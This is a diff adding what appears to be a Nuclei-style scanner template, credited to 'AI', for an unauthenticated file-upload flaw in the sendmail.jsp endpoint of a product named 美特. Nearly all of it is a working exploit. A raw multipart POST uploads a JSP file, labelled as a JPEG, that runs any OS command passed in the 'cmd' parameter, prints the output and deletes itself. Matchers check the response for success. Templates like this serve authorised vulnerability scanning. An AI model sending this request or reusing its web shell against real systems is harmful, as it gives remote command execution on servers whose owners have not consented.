@@ -1,0 +1,36 @@
+id: 美特-sendmail-upload
+
+info:
+  name: 美特-sendmail-upload
+  author: AI
+  severity: critical
+  description: |
+    This template exploits a vulnerability in `/business/ums/sendmail.jsp` allowing remote code execution by uploading a malicious JSP file. The condition for a successful exploit is a 200 status code and the presence of "affixpath" in the response body.
+  tags: rce, file-upload
+
+http:
+  - raw:
+      - |
+        POST /business/ums/sendmail.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible: MSIE 8.0; Windows NT 6.1)
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryffJZ4P1AZBixJEL
+
+        ------WebKitFormBoundaryffJZ4P1AZBixJEL
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+        Content-Type: image/jpeg
+
+        <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryffJZ4P1AZBixJEL--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "affixpath"
